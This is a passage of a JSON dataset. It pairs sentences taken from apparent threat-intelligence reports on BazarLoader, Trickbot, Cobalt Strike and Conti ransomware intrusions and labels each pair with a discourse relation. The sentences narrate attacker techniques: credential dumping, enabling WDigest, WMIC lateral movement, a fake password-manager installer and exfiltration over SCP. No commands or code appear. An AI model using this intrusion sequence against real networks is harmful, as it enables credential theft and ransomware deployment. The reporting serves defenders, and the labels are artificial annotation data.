        "S2": "For this intrusion we don\u2019t know the initial campaign that deployed the malware but based on previous information, we can assess with high confidence that the delivery vector was a malicious email campaign.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For this intrusion we don\u2019t know the initial campaign that deployed the malware but based on previous information, we can assess with high confidence that the delivery vector was a malicious email campaign.",
        "S2": "At the time of the intrusion, the group was favoring zip attachments with malicious javascript files to download the BazarLoader malware.",
        "relation": "NEXT"
    },
    {
        "S1": "At the time of the intrusion, the group was favoring zip attachments with malicious javascript files to download the BazarLoader malware.",
        "S2": "However BazarLoader has also been used with Word and Excel documents as well.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However BazarLoader has also been used with Word and Excel documents as well.",
        "S2": "In this case we observed the initial activity beginning with a BazarLoader DLL.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case we observed the initial activity beginning with a BazarLoader DLL.",
        "S2": "Upon initial execution on the beachhead, the malware made an initial connection to command and control, and then a few minutes later it performed discovery tasks on the host using Microsoft utilities like Net and Nltest to discover the domain and users of interest.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon initial execution on the beachhead, the malware made an initial connection to command and control, and then a few minutes later it performed discovery tasks on the host using Microsoft utilities like Net and Nltest to discover the domain and users of interest.",
        "S2": "like domain administrators.",
        "relation": "ELABORATION"
    },
    {
        "S1": "like domain administrators.",
        "S2": "After this activity, the host went quiet for about one hour before downloading and executing a Cobalt Strike beacon DLL.",
        "relation": "MISC"
    },
    {
        "S1": "After this activity, the host went quiet for about one hour before downloading and executing a Cobalt Strike beacon DLL.",
        "S2": "The threat actors used Cobalt Strike to run additional discovery tasks using Microsoft utilities like net, ping, systeminfo, and taskmanager.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors used Cobalt Strike to run additional discovery tasks using Microsoft utilities like net, ping, systeminfo, and taskmanager.",
        "S2": "The threat actors then began using pass the hash with various accounts which continued several times throughout the intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then began using pass the hash with various accounts which continued several times throughout the intrusion.",
        "S2": "To see what machines were active in the environment, the threat actors scanned the network for SMB.",
        "relation": "MISC"
    },
    {
        "S1": "To see what machines were active in the environment, the threat actors scanned the network for SMB.",
        "S2": "Around two and a half hours into the intrusion the threat actors began lateral movement.",
        "relation": "NEXT"
    },
    {
        "S1": "Around two and a half hours into the intrusion the threat actors began lateral movement.",
        "S2": "Lateral movement began by the threat actor transferring an executable to a remote system and then executing it using wmic.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Lateral movement began by the threat actor transferring an executable to a remote system and then executing it using wmic.",
        "S2": "This was the primary lateral movement option favored by the threat actor, however PowerShell Cobalt Strike beacons, service executable Cobalt Strike beacons, and RDP were all used, but less commonly.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was the primary lateral movement option favored by the threat actor, however PowerShell Cobalt Strike beacons, service executable Cobalt Strike beacons, and RDP were all used, but less commonly.",
        "S2": "Once on remote systems the threat actor used Cobalt Strike to dump lsass memory for further credentials.",
        "relation": "NEXT"
    },
    {
        "S1": "Once on remote systems the threat actor used Cobalt Strike to dump lsass memory for further credentials.",
        "S2": "After this phase completed, the threat actor\u2019s activity faded but the Cobalt Strike continued to beacon out to the C2 server.",
        "relation": "NEXT"
    },
    {
        "S1": "After this phase completed, the threat actor\u2019s activity faded but the Cobalt Strike continued to beacon out to the C2 server.",
        "S2": "About 12 hours later the threat actors became active again.",
        "relation": "NEXT"
    },
    {
        "S1": "About 12 hours later the threat actors became active again.",
        "S2": "From the domain controller the threat actors continued further lateral movement to more servers in the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "From the domain controller the threat actors continued further lateral movement to more servers in the environment.",
        "S2": "They also continued further discovery activity running PowerShell scripts to discover the disk utilization of hosts, review user last login time per host, assess the installed anti-virus software, and track which hosts were online for the threat actors to target.",
        "relation": "NEXT"
    },
    {
        "S1": "They also continued further discovery activity running PowerShell scripts to discover the disk utilization of hosts, review user last login time per host, assess the installed anti-virus software, and track which hosts were online for the threat actors to target.",
        "S2": "When the threat actors identified the file server, their method for data exfiltration was straightforward to a fault.",
        "relation": "NEXT"
    },
    {
        "S1": "When the threat actors identified the file server, their method for data exfiltration was straightforward to a fault.",
        "S2": "They downloaded WinSCP from the project website, installed it on the file server and proceeded to exfiltrate data from the server using SCP to a VPS host they controlled in Romania.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They downloaded WinSCP from the project website, installed it on the file server and proceeded to exfiltrate data from the server using SCP to a VPS host they controlled in Romania.",
        "S2": "Around 31 hours after initial access to the environment, the threat actors felt they were ready to complete their final objectives.",
        "relation": "MISC"
    },
    {
        "S1": "Around 31 hours after initial access to the environment, the threat actors felt they were ready to complete their final objectives.",
        "S2": "RDP activity was seen from several hosts and an executable named test.exe was transferred to several endpoints.",
        "relation": "MISC"
    },
    {
        "S1": "RDP activity was seen from several hosts and an executable named test.exe was transferred to several endpoints.",
        "S2": "This test file was the Conti ransomware executable, and the threat actors decided to test in a controlled manner before running the full domain ransomware deployment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This test file was the Conti ransomware executable, and the threat actors decided to test in a controlled manner before running the full domain ransomware deployment.",
        "S2": "Like before, these \u201cunit tests,\u201d were performed using wmic to execute the files remotely on the endpoints.",
        "relation": "MISC"
    },
    {
        "S1": "Like before, these \u201cunit tests,\u201d were performed using wmic to execute the files remotely on the endpoints.",
        "S2": "The threat actors must have confirmed quickly that their tests were successful as within minutes they dropped test.exe renamed to backup.exe on two servers in the environment and executed manually via their RDP sessions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors must have confirmed quickly that their tests were successful as within minutes they dropped test.exe renamed to backup.exe on two servers in the environment and executed manually via their RDP sessions.",
        "S2": "When executed in this manner the ransomware mounts all remote C$ drives in the local network and proceeds to encrypt the contents over the SMB connection.",
        "relation": "MISC"
    },
    {
        "S1": "When executed in this manner the ransomware mounts all remote C$ drives in the local network and proceeds to encrypt the contents over the SMB connection.",
        "S2": "At this point, the Time to Ransom (TTR) for the threat actors was just shy of 32 hours since initial access.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At this point, the Time to Ransom (TTR) for the threat actors was just shy of 32 hours since initial access.",
        "S2": "In this case we did not observe the initial delivery for the malware.",
        "relation": "MISC"
    },
    {
        "S1": "In this case we did not observe the initial delivery for the malware.",
        "S2": "BazarLoader however tends to arrive in an environment via malicious email campaigns and in a few cases its been reported via call centers social engineering users to load the malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "BazarLoader however tends to arrive in an environment via malicious email campaigns and in a few cases its been reported via call centers social engineering users to load the malware.",
        "S2": "Seeing that this starts with a DLL file it is more likely that this was related to an email campaign using malicious zipped Javascript files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Seeing that this starts with a DLL file it is more likely that this was related to an email campaign using malicious zipped Javascript files.",
        "S2": "Initial execution occurred via the Bazarloader DLL being executed by rundll32.",
        "relation": "MISC"
    },
    {
        "S1": "Initial execution occurred via the Bazarloader DLL being executed by rundll32.",
        "S2": "About an hour after the initial execution on the beachhead, a Cobalt Strike beacon was executed also with rundll32.",
        "relation": "NEXT"
    },
    {
        "S1": "About an hour after the initial execution on the beachhead, a Cobalt Strike beacon was executed also with rundll32.",
        "S2": "The threat actors made use of pass the hash techniques to try to escalate privileges during the intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors made use of pass the hash techniques to try to escalate privileges during the intrusion.",
        "S2": "Various accounts were targeted including a Guest account initially.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Various accounts were targeted including a Guest account initially.",
        "S2": "Process injection was seen from the Cobalt Strike beacon into a svchost process running with System level privilege.",
        "relation": "MISC"
    },
    {
        "S1": "Process injection was seen from the Cobalt Strike beacon into a svchost process running with System level privilege.",
        "S2": "While in the environment they injected Cobalt Strike beacons into many processes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While in the environment they injected Cobalt Strike beacons into many processes.",
        "S2": "Processes with CS beacon injected or running",
        "relation": "ELABORATION"
    },
    {
        "S1": "Processes with CS beacon injected or running",
        "S2": "The threat actors were seen dumping credentials out of lsass memory across the domain.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors were seen dumping credentials out of lsass memory across the domain.",
        "S2": "The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution.",
        "relation": "MISC"
    },
    {
        "S1": "The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution.",
        "S2": "The discovery commands utilize the familiar built in Microsoft utilities.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The discovery commands utilize the familiar built in Microsoft utilities.",
        "S2": "The Cobalt Strike beacon ran additional discovery tasks on the beachhead.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cobalt Strike beacon ran additional discovery tasks on the beachhead.",
        "S2": "Again built in Microsoft utilities were utilized.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Again built in Microsoft utilities were utilized.",
        "S2": "Throughout the intrusion the threat actor checked the time of systems with:",
        "relation": "MISC"
    },
    {
        "S1": "Throughout the intrusion the threat actor checked the time of systems with:",
        "S2": "From an svchost process injected with a Cobalt Strike beacon, SMB scanning was performed across the environment.",
        "relation": "MISC"
    },
    {
        "S1": "From an svchost process injected with a Cobalt Strike beacon, SMB scanning was performed across the environment.",
        "S2": "From the domain controller the threat actor ran an encoded PowerShell command to review the size and condition of hard drives across the environment.",
        "relation": "MISC"
    },
    {
        "S1": "From the domain controller the threat actor ran an encoded PowerShell command to review the size and condition of hard drives across the environment.",
        "S2": "Powersploit modules like Get-NetComputer were seen used by the threat actor from the domain controller",
        "relation": "ELABORATION"
    },
    {
        "S1": "Powersploit modules like Get-NetComputer were seen used by the threat actor from the domain controller",
        "S2": "The script Get-DataInfo.ps1, which has been used in many intrusions this past year, was also employed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The script Get-DataInfo.ps1, which has been used in many intrusions this past year, was also employed.",
        "S2": "This file was started by the use of start.bat, which has been seen paired with this script repeatedly.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This file was started by the use of start.bat, which has been seen paired with this script repeatedly.",
        "S2": "The contents of Get-DataInfo.ps1 provide the threat actor with very specific details of the environment.",
        "relation": "MISC"
    },
    {
        "S1": "The contents of Get-DataInfo.ps1 provide the threat actor with very specific details of the environment.",
        "S2": "This includes things like disk size, connectivity, antivirus software, and backup software.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This includes things like disk size, connectivity, antivirus software, and backup software.",
        "S2": "This script was first reported used by threat actors deploying the Ryuk ransomware strain.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This script was first reported used by threat actors deploying the Ryuk ransomware strain.",
        "S2": "The Microsoft Active Directory PowerShell module was also imported and used for discovery tasks.",
        "relation": "MISC"
    },
    {
        "S1": "The Microsoft Active Directory PowerShell module was also imported and used for discovery tasks.",
        "S2": "For lateral movement the threat actors relied heavily on copying executable files over SMB and then executing them via remote WMIC calls",
        "relation": "MISC"
    },
    {
        "S1": "For lateral movement the threat actors relied heavily on copying executable files over SMB and then executing them via remote WMIC calls",
        "S2": "While executables and wmic were the preferred options for the threat actor, they did employ several other techniques.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While executables and wmic were the preferred options for the threat actor, they did employ several other techniques.",
        "S2": "Remote Cobalt Strike beacons were started with services and PowerShell several times in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "Remote Cobalt Strike beacons were started with services and PowerShell several times in the environment.",
        "S2": "During the final stages the threat actor used RDP to move between a few servers as part of their final actions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During the final stages the threat actor used RDP to move between a few servers as part of their final actions.",
        "S2": "At that time, a Cobalt Strike beacon executable was executed as a service on a remote host for testing the final ransom deployment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At that time, a Cobalt Strike beacon executable was executed as a service on a remote host for testing the final ransom deployment.",
        "S2": "This server was seen communicating with multiple internal systems:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This server was seen communicating with multiple internal systems:",
        "S2": "In addition to these command and control methods, one more network anomaly was observed.",
        "relation": "MISC"
    },
    {
        "S1": "In addition to these command and control methods, one more network anomaly was observed.",
        "S2": "This was not used for primary command and control and the amount of data sent was small so we do not know the full intentions of the activity but several critical systems like domain controllers and file servers made connections to TOR nodes initiated by the threat actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was not used for primary command and control and the amount of data sent was small so we do not know the full intentions of the activity but several critical systems like domain controllers and file servers made connections to TOR nodes initiated by the threat actors.",
        "S2": "The threat actor on the second day of the intrusion downloaded WinSCP to the file server and proceeded to install the program there.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor on the second day of the intrusion downloaded WinSCP to the file server and proceeded to install the program there.",
        "S2": "The threat actor then proceeded to connect over port 22 to a server in Romania.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then proceeded to connect over port 22 to a server in Romania.",
        "S2": "As the traffic was encrypted we can\u2019t conclusively determine what data was exfiltrated.",
        "relation": "MISC"
    },
    {
        "S1": "As the traffic was encrypted we can\u2019t conclusively determine what data was exfiltrated.",
        "S2": "However we can infer that the choice to deploy on the file server was due to the data present and ease to move the data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However we can infer that the choice to deploy on the file server was due to the data present and ease to move the data.",
        "S2": "Another data point is that following the exfiltration canary documents present in the shares reported in as being opened from an IP on a Virtual Private Host provider in New York, USA.",
        "relation": "MISC"
    },
    {
        "S1": "Another data point is that following the exfiltration canary documents present in the shares reported in as being opened from an IP on a Virtual Private Host provider in New York, USA.",
        "S2": "During the overnight hours of the 2nd day the threat actors began moving on their final objectives.",
        "relation": "MISC"
    },
    {
        "S1": "During the overnight hours of the 2nd day the threat actors began moving on their final objectives.",
        "S2": "This included testing their ransomware in the compromised environment before deploying across the domain.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This included testing their ransomware in the compromised environment before deploying across the domain.",
        "S2": "They initiated RDP connections and a Cobalt Strike beacon executable file to a endpoint not yet interacted with by the threat actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They initiated RDP connections and a Cobalt Strike beacon executable file to a endpoint not yet interacted with by the threat actors.",
        "S2": "The threat actor then transferred a Conti executable file to several endpoints named test.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then transferred a Conti executable file to several endpoints named test.exe.",
        "S2": "These test ransom files were then called remotely using wmic as seen in the previous lateral movement activity.",
        "relation": "NEXT"
    },
    {
        "S1": "These test ransom files were then called remotely using wmic as seen in the previous lateral movement activity.",
        "S2": "After testing on several endpoints, the threat actors dropped a renamed version of the file on several servers in the environment and executed by hand using their RDP session.",
        "relation": "NEXT"
    },
    {
        "S1": "After testing on several endpoints, the threat actors dropped a renamed version of the file on several servers in the environment and executed by hand using their RDP session.",
        "S2": "When executed in this manner, the ransomware payload attempts to spread laterally over SMB.",
        "relation": "NEXT"
    },
    {
        "S1": "When executed in this manner, the ransomware payload attempts to spread laterally over SMB.",
        "S2": "From there, the threat actors left the environment with this note and domain wide encryption completed about 32 hours after the initial beachhead BazarLoader was executed.",
        "relation": "NEXT"
    },
    {
        "S1": "We assess with medium confidence that the initial threat vector for this intrusion was a password protected archive, delivered via malspam campaigns.",
        "S2": "The zip attachment would likely contain a Word or Excel document with macros, which upon execution, would start a Trickbot infection.",
        "relation": "NEXT"
    },
    {
        "S1": "The zip attachment would likely contain a Word or Excel document with macros, which upon execution, would start a Trickbot infection.",
        "S2": "The Trickbot payload injected itself into the system process wermgr.exe \u2014 the Windows process responsible for error reporting.",
        "relation": "NEXT"
    },
    {
        "S1": "The Trickbot payload injected itself into the system process wermgr.exe \u2014 the Windows process responsible for error reporting.",
        "S2": "The threat actor then utilized built-in Windows utilities such as net.exe, ipconfig.exe and nltest.exe for performing internal reconnaissance.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then utilized built-in Windows utilities such as net.exe, ipconfig.exe and nltest.exe for performing internal reconnaissance.",
        "S2": "Within two minutes of the discovery activity, WDigest authentication was enabled (disabled by default in Windows 10) in the registry on the infected host.",
        "relation": "NEXT"
    },
    {
        "S1": "Within two minutes of the discovery activity, WDigest authentication was enabled (disabled by default in Windows 10) in the registry on the infected host.",
        "S2": "This enforces credential information to be saved in cleartext in memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This enforces credential information to be saved in cleartext in memory.",
        "S2": "Shortly after applying this registry modification, the LSASS process was dumped to disk using the Sysinternals tool ProcDump.",
        "relation": "MISC"
    },
    {
        "S1": "Shortly after applying this registry modification, the LSASS process was dumped to disk using the Sysinternals tool ProcDump.",
        "S2": "Having obtained sensitive credentials, WMIC was used to deploy a fake password manager application across multiple systems in the network.",
        "relation": "NEXT"
    },
    {
        "S1": "Having obtained sensitive credentials, WMIC was used to deploy a fake password manager application across multiple systems in the network.",
        "S2": "The installed software package appears to have been trying to masquerade as the 1Password windows installer and password vault software.",
        "relation": "NEXT"
    },
    {
        "S1": "The installed software package appears to have been trying to masquerade as the 1Password windows installer and password vault software.",
        "S2": "The fake installer drops and executes a file embedded with Cobalt Strike stager shellcode, which attempts to fetch a CS beacon.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The fake installer drops and executes a file embedded with Cobalt Strike stager shellcode, which attempts to fetch a CS beacon.",
        "S2": "With the additional remote sessions, the attackers ran encoded PowerShell commands, one of which loaded the Active Directory module and collected information about Windows computers in the domain.",
        "relation": "MISC"
    },
    {
        "S1": "With the additional remote sessions, the attackers ran encoded PowerShell commands, one of which loaded the Active Directory module and collected information about Windows computers in the domain.",
        "S2": "The results were dumped into a CSV file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The results were dumped into a CSV file.",
        "S2": "Another PowerShell script, named \u201cGet-DataInfo.ps1\u201d, aimed to provide a list of active systems including its anti-virus state.",
        "relation": "MISC"
    },
    {
        "S1": "Another PowerShell script, named \u201cGet-DataInfo.ps1\u201d, aimed to provide a list of active systems including its anti-virus state.",
        "S2": "This behavior was also observed in one of our previous intrusion cases.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This behavior was also observed in one of our previous intrusion cases.",
        "S2": "No exfiltration of data or impact to the systems was observed.",
        "relation": "MISC"
    },
    {
        "S1": "No exfiltration of data or impact to the systems was observed.",
        "S2": "It is unclear why the actors decided not to continue with their operation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is unclear why the actors decided not to continue with their operation.",
        "S2": "The Trickbot payload seen during this intrusion was likely spread via a weaponized Word or Excel file from an email campaign.",
        "relation": "MISC"
    },
    {
        "S1": "The Trickbot payload seen during this intrusion was likely spread via a weaponized Word or Excel file from an email campaign.",
        "S2": "The Trickbot payload (1a5f3ca6597fcccd3295ead4d22ce70b.exe) was manually executed on a single endpoint.",
        "relation": "NEXT"
    },
    {
        "S1": "The Trickbot payload (1a5f3ca6597fcccd3295ead4d22ce70b.exe) was manually executed on a single endpoint.",
        "S2": "The visual representation of process tree execution pattern on beachhead can be seen below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The visual representation of process tree execution pattern on beachhead can be seen below.",
        "S2": "Upon execution, the payload injects into the wermgr.exe process.",
        "relation": "MISC"
    },
    {
        "S1": "Upon execution, the payload injects into the wermgr.exe process.",
        "S2": "The injected wermgr.exe process then creates a new folder in the user\u2019s AppData directory.",
        "relation": "NEXT"
    },
    {
        "S1": "The injected wermgr.exe process then creates a new folder in the user\u2019s AppData directory.",
        "S2": "As typically seen in Trickbot infections, it drops a copy of itself into this folder along with its encrypted config (settings.ini) and a batch file (launcher.bat).",
        "relation": "NEXT"
    },
    {
        "S1": "As typically seen in Trickbot infections, it drops a copy of itself into this folder along with its encrypted config (settings.ini) and a batch file (launcher.bat).",
        "S2": "Trickbot utilized the same instance of wermgr.exe to load Cobalt Strike beacons into memory using PowerShell, which remained active throughout the intrusion:",
        "relation": "NEXT"
    },
    {
        "S1": "Trickbot utilized the same instance of wermgr.exe to load Cobalt Strike beacons into memory using PowerShell, which remained active throughout the intrusion:",
        "S2": "The fake setup installer (Setup1.exe) which was seen during the lateral movement stage, was dropped and executed on multiple systems, including the domain controllers.",
        "relation": "LIST"
    },
    {
        "S1": "The fake setup installer (Setup1.exe) which was seen during the lateral movement stage, was dropped and executed on multiple systems, including the domain controllers.",
        "S2": "The launcher.bat file, which triggers the Trickbot executable, is set to start via a scheduled task:",
        "relation": "LIST"
    },
    {
        "S1": "The launcher.bat file, which triggers the Trickbot executable, is set to start via a scheduled task:",
        "S2": "The GetSystem named pipe impersonation technique was observed to obtain SYSTEM-level privileges on the domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "The GetSystem named pipe impersonation technique was observed to obtain SYSTEM-level privileges on the domain controller.",
        "S2": "To prepare for code injection, the Trickbot executable allocated memory in the address space of the Windows system process \u201cwermgr.exe\u201d (Windows Error Reporting Module).",
        "relation": "MISC"
    },
    {
        "S1": "To prepare for code injection, the Trickbot executable allocated memory in the address space of the Windows system process \u201cwermgr.exe\u201d (Windows Error Reporting Module).",
        "S2": "The injected wermgr.exe process then called svchost.exe (without any command line arguments), which in turn was used to run various reconnaissance commands.",
        "relation": "NEXT"
    },
    {
        "S1": "The injected wermgr.exe process then called svchost.exe (without any command line arguments), which in turn was used to run various reconnaissance commands.",
        "S2": "More about that in the \u201cDiscovery\u201d section below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "More about that in the \u201cDiscovery\u201d section below.",
        "S2": "The threat actor enabled WDigest authentication by changing the value of the \u201cUseLogonCredential\u201d object from 0 to 1 in the Windows registry.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor enabled WDigest authentication by changing the value of the \u201cUseLogonCredential\u201d object from 0 to 1 in the Windows registry.",
        "S2": "This enforces the storage of credentials in plaintext on future logins.",
        "relation": "NEXT"
    },
    {
        "S1": "This enforces the storage of credentials in plaintext on future logins.",
        "S2": "On the initial beachhead, various discovery commands were executed from the injected svchost.exe process.",
        "relation": "MISC"
    },
    {
        "S1": "On the initial beachhead, various discovery commands were executed from the injected svchost.exe process.",
        "S2": "A diverse set of reconnaissance commands were also observed from the Cobalt Strike beacons:",
        "relation": "ELABORATION"
    },
    {
        "S1": "A diverse set of reconnaissance commands were also observed from the Cobalt Strike beacons:",
        "S2": "Using the WMI class \u201cwin32_logicaldisk\u201d, (free) disk space information was gathered of the attached (network) drive letters.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Using the WMI class \u201cwin32_logicaldisk\u201d, (free) disk space information was gathered of the attached (network) drive letters.",
        "S2": "The threat actor made use of the Active Directory module to save hostname, OS and last logon date information of all AD Computer objects in a CSV file.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor made use of the Active Directory module to save hostname, OS and last logon date information of all AD Computer objects in a CSV file.",
        "S2": "In addition, all of the IP-addresses in the LAN were scanned on port 445/SMB, potentially to identify other interesting targets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In addition, all of the IP-addresses in the LAN were scanned on port 445/SMB, potentially to identify other interesting targets.",
        "S2": "The following set of files were copied to the domain controller:",
        "relation": "MISC"
    },
    {
        "S1": "The following set of files were copied to the domain controller:",
        "S2": "Already covered in a previous case, the batch and PowerShell scripts serve as a data collector to enumerate hosts within the target environment.",
        "relation": "MISC"
    },
    {
        "S1": "Already covered in a previous case, the batch and PowerShell scripts serve as a data collector to enumerate hosts within the target environment.",
        "S2": "It collects data about active/dead hosts, disks, and installed software; and stores it in a zip file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It collects data about active/dead hosts, disks, and installed software; and stores it in a zip file.",
        "S2": "A file named Setup1.exe was dropped on multiple systems within the environment and executed using WMIC.",
        "relation": "MISC"
    },
    {
        "S1": "A file named Setup1.exe was dropped on multiple systems within the environment and executed using WMIC.",
        "S2": "In an attempt to blend in, the Setup1.exe file acts as a fake installer for \u201c1Password\u201d, a popular online password manager.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In an attempt to blend in, the Setup1.exe file acts as a fake installer for \u201c1Password\u201d, a popular online password manager.",
        "S2": "When the file is executed, it drops various files in the user\u2019s AppData directory, including \u201cfilepass.exe\u201d, which is started as a child process.",
        "relation": "NEXT"
    },
    {
        "S1": "When the file is executed, it drops various files in the user\u2019s AppData directory, including \u201cfilepass.exe\u201d, which is started as a child process.",
        "S2": "It appears the threat actors used LPUB3D as a shell for this install, as all the folders and some of the dlls are from LPub3D, an Open Source WYSIWYG editing application for creating LEGO\u00ae style digital building instructions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It appears the threat actors used LPUB3D as a shell for this install, as all the folders and some of the dlls are from LPub3D, an Open Source WYSIWYG editing application for creating LEGO\u00ae style digital building instructions.",
        "S2": "Filepass.exe then loads an unsigned DLL named theora2.dll:",
        "relation": "MISC"
    },
    {
        "S1": "Filepass.exe then loads an unsigned DLL named theora2.dll:",
        "S2": "theora2.dll reads the data from an XML-file named \u201ccds.xml\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "theora2.dll reads the data from an XML-file named \u201ccds.xml\u201d.",
        "S2": "This file is stored in the same directory (AppData\\Roaming\\1Password).",
        "relation": "NEXT"
    },
    {
        "S1": "This file is stored in the same directory (AppData\\Roaming\\1Password).",
        "S2": "This file seems to contain the XML documentation (in Russian) of the System.IO package.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This file seems to contain the XML documentation (in Russian) of the System.IO package.",
        "S2": "If we scroll down in the XML-file, we will find data patterns which seem to be obfuscated and unreadable:",
        "relation": "ELABORATION"
    },
    {
        "S1": "If we scroll down in the XML-file, we will find data patterns which seem to be obfuscated and unreadable:",
        "S2": "A subset of the file buffer (cds.xml), which contains the obfuscated data patterns, is saved into a separate memory location.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A subset of the file buffer (cds.xml), which contains the obfuscated data patterns, is saved into a separate memory location.",
        "S2": "The obfuscated/encrypted shellcode is then sent into a Cobalt Strike named pipe.",
        "relation": "NEXT"
    },
    {
        "S1": "The obfuscated/encrypted shellcode is then sent into a Cobalt Strike named pipe.",
        "S2": "In this case, the threat actor did not bother to change the default pipe naming convention of Cobalt Strike.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the threat actor did not bother to change the default pipe naming convention of Cobalt Strike.",
        "S2": "Pipes being created with the name MSSE-*-server are a great indicator to hunt for.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Pipes being created with the name MSSE-*-server are a great indicator to hunt for.",
        "S2": "From here, the CS stager used the WinInet API in an attempt to fetch a Cobalt Strike beacon hosted on windowsupdatesc[.]com.",
        "relation": "NEXT"
    },
    {
        "S1": "From here, the CS stager used the WinInet API in an attempt to fetch a Cobalt Strike beacon hosted on windowsupdatesc[.]com.",
        "S2": "In the raw shellcode we can find the URI and the User-Agent:",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the raw shellcode we can find the URI and the User-Agent:",
        "S2": "The HTTPS beacon spawned by filepass.exe continues to check in every ~5 seconds.",
        "relation": "MISC"
    },
    {
        "S1": "The HTTPS beacon spawned by filepass.exe continues to check in every ~5 seconds.",
        "S2": "The initial Trickbot traffic can be seen in blue, followed by the Cobalt Strike traffic in red: https://tria.ge/210617-6hxwajevbs",
        "relation": "MISC"
    },
    {
        "S1": "The initial Trickbot traffic can be seen in blue, followed by the Cobalt Strike traffic in red: https://tria.ge/210617-6hxwajevbs",
        "S2": "Example request:",
        "relation": "MISC"
    },
    {
        "S1": "In this intrusion, we observed a number of interesting techniques being leveraged by the threat actors.",
        "S2": "The threat actors were able to go from initial access to the deployment of Conti ransomware in a matter of hours.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors were able to go from initial access to the deployment of Conti ransomware in a matter of hours.",
        "S2": "The Conti operators chose to wait a couple days before ransoming the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Conti operators chose to wait a couple days before ransoming the environment.",
        "S2": "Even though most of the techniques aren\u2019t new or advanced, they have proven to be effective.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Even though most of the techniques aren\u2019t new or advanced, they have proven to be effective.",
        "S2": "We have observed the same techniques in other intrusions and understanding these techniques will allow defenders to disrupt such intrusion activity and deny it in their own networks.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We have observed the same techniques in other intrusions and understanding these techniques will allow defenders to disrupt such intrusion activity and deny it in their own networks.",
        "S2": "The Trickbot payload came from a phishing campaign associated with BazarCall, delivering weaponized XLSB files.",
        "relation": "MISC"
    },
    {
        "S1": "The Trickbot payload came from a phishing campaign associated with BazarCall, delivering weaponized XLSB files.",
        "S2": "Upon execution, certutil.exe was copied to %programdata% and renamed with random alphanumeric characters.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon execution, certutil.exe was copied to %programdata% and renamed with random alphanumeric characters.",
        "S2": "Certutil was used to download and load the Trickbot DLL into memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Certutil was used to download and load the Trickbot DLL into memory.",
        "S2": "Trickbot was automatically tasked to inject into the wermgr.exe process and use its well-known \u201cpwgrab\u201d module to steal browser credentials.",
        "relation": "NEXT"
    },
    {
        "S1": "Trickbot was automatically tasked to inject into the wermgr.exe process and use its well-known \u201cpwgrab\u201d module to steal browser credentials.",
        "S2": "As part of further automated tasking, Trickbot performed an initial reconnaissance of the environment using native Windows tools such as nltest.exe and net.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "As part of further automated tasking, Trickbot performed an initial reconnaissance of the environment using native Windows tools such as nltest.exe and net.exe.",
        "S2": "First hands-on activity was observed two hours after initial compromise, when Trickbot downloaded and executed Cobalt Strike Beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "First hands-on activity was observed two hours after initial compromise, when Trickbot downloaded and executed Cobalt Strike Beacons.",
